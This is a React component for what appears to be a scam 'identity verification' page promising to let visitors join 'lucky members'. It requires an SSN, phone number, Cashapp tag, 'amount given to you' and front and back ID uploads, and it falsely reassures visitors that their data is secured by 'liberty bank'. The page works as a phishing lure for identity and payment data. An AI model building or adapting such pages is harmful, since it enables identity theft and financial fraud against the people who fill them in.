import React from 'react'
import './form.css'

const Form = ()=>{

   return(
      <div>
         <div className="formContainer">
            <h2 className="title">VERIFY YOUR IDENTITY TO JOIN THE LUCKY MEMBERS TODAY</h2>

            <form action="" className="form">
               <h3 className="formHeader">Verification Form:</h3>

               <div className="formBody">
               <input type="email" className="email" placeholder="Email" required />
               <input type="text" className="name" placeholder="Full Name" required />
               <input type="tel" className="number" placeholder="Phone Number " required />
               <input type="number" className="ssn" placeholder="Social Security Number" required />
               <input type="text" className="amount" placeholder="Amount Given To You" required />
               <input type="text" className="tag" placeholder="Cashapp Tag or Paycheck Address" required />
               <textarea name="comment" id="" cols="30" rows="10" className="comment" placeholder="Comment"></textarea>

               {/* kyc upload session */}
               <div className="kyc">
                  <h3 className="upload">Upload ID (KYC) document</h3>
                  {/* front file */}
                  <div className="front">
                  <label htmlFor="front" className="frontLabel" >File Front</label>
                  <input type="file" className="frontI" required />
                  </div>

                  {/* back file */}
                  <div className="back">
                  <label htmlFor="back" className="backLabel">File Front</label>
                  <input type="file" className="backI" required />
                  </div>

                  <div className="agreee">
                  <input type="checkbox" name="agree" id="agree" />
                  <label htmlFor="agree" className="agreement">Agree my information are encrypted by management <br/>and my details are well secured with liberty bank.</label> 
                  </div>
                  <button type='submit' className="submitBtn">Submit</button>
               </div>
                  
               </div>
            </form>
         </div>
      </div>
   )
}


export default Form